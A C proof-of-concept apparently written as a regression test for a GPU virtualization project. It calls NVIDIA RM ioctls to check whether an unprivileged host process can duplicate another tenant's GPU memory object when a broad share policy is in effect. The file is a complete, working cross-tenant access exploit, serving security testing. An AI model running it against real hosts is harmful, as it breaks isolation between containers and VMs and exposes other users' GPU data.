/*
 * poc_cross_proc_dup.c — Phase 4 proof-of-concept / regression oracle.
 *
 * Demonstrates the cross-process / cross-tenant hole created by granting
 * RS_SHARE_TYPE_ALL on RM objects (nvkvm's Path-α auto-grant): an UNPRIVILEGED
 * host process that merely (a) opens /dev/nvidiactl and (b) names a victim's
 * (hClientSrc, hObjectSrc) can DUP the victim's GPU object — across containers
 * and across VMs — because handles are a global, access-gated namespace and
 * TYPE_ALL removes the default per-PID containment.
 *
 * Usage:  poc_cross_proc_dup <hClientSrc> <hObjectSrc>
 *   (handles captured from the victim, e.g. nvkvm's "post-alloc SHARE
 *    hClient=0x.. hObj=0x.." log line for a 0x40 NV01_MEMORY_LOCAL_USER object.)
 *
 * Exit 0 + "DUP SUCCEEDED" => the hole is OPEN (TYPE_ALL still in effect).
 * Non-zero + "DUP DENIED"  => containment holds (grant narrowed / no TYPE_ALL).
 *
 * This talks to the host kernel DIRECTLY, bypassing nvkvm's QEMU/stub — so it
 * tests the ONLY layer that can stop a host neighbour: the kernel share policy.
 * Builds freestanding against the in-tree ABI header; no CUDA/RM SDK needed.
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>

/* Minimal local copies of the two ABI structs (must match src/abi/nvgpu.h). */
struct nvos21 {            /* NV_ESC_RM_ALLOC, 32B */
	uint32_t h_root;
	uint32_t h_object_parent;
	uint32_t h_object_new;
	uint32_t h_class;
	uint64_t p_alloc_parms;
	uint32_t status;
	uint32_t _pad;
};
struct nvos55 {            /* NV_ESC_RM_DUP_OBJECT, 28B (575 SDK) */
	uint32_t h_client;       /* dest client      */
	uint32_t h_parent;       /* parent of new obj */
	uint32_t h_object;       /* dest new handle  */
	uint32_t h_client_src;   /* source client    */
	uint32_t h_src_object;   /* source object    */
	uint32_t flags;
	uint32_t status;
};

#define NV_IOWR(nr, sz) (0xc0000000u | ((unsigned)(sz) << 16) | (0x46u << 8) | (nr))
#define ESC_RM_ALLOC       0x2b
#define ESC_RM_DUP_OBJECT  0x34
#define NV01_ROOT          0x0

int main(int argc, char **argv)
{
	if (argc != 3) {
		fprintf(stderr, "usage: %s <hClientSrc> <hObjectSrc>\n", argv[0]);
		return 2;
	}
	uint32_t h_client_src = (uint32_t)strtoul(argv[1], NULL, 0);
	uint32_t h_src_object = (uint32_t)strtoul(argv[2], NULL, 0);

	int fd = open("/dev/nvidiactl", O_RDWR);
	if (fd < 0) { perror("open /dev/nvidiactl"); return 3; }

	/* 1. Allocate our OWN root client — a totally separate RM client, as any
	 *    unprivileged host process can. */
	uint32_t my_client = 0xbeef0001;
	struct nvos21 a = {
		.h_root = 0, .h_object_parent = 0,
		.h_object_new = my_client, .h_class = NV01_ROOT,
		.p_alloc_parms = 0, .status = 0,
	};
	if (ioctl(fd, NV_IOWR(ESC_RM_ALLOC, sizeof a), &a) < 0 || a.status != 0) {
		fprintf(stderr, "root client alloc failed: ioctl errno=%d status=0x%x\n",
			errno, a.status);
		/* Some builds assign the handle; retry reading it back. */
		if (a.h_object_new) my_client = a.h_object_new;
		else return 4;
	}
	my_client = a.h_object_new ? a.h_object_new : my_client;
	fprintf(stderr, "poc: my client = 0x%x\n", my_client);

	/* 2. Attempt to DUP the victim's object into our client purely by naming
	 *    its (hClientSrc, hObjectSrc). No prior relationship to the victim. */
	struct nvos55 d = {
		.h_client = my_client,
		.h_parent = my_client,            /* parent the dup under our client */
		.h_object = (my_client & 0xffff0000u) | 0x0abc, /* new handle in our space */
		.h_client_src = h_client_src,
		.h_src_object = h_src_object,
		.flags = 0, .status = 0,
	};
	int r = ioctl(fd, NV_IOWR(ESC_RM_DUP_OBJECT, sizeof d), &d);
	fprintf(stderr, "poc: DUP src=(0x%x,0x%x) -> ioctl=%d errno=%d status=0x%x\n",
		h_client_src, h_src_object, r, errno, d.status);

	if (r == 0 && d.status == 0) {
		printf("DUP SUCCEEDED — cross-process access to victim object 0x%x "
		       "(hole OPEN)\n", h_src_object);
		return 0;
	}
	printf("DUP DENIED — kernel refused cross-process dup (status=0x%x) "
	       "(containment holds)\n", d.status);
	return 1;
}
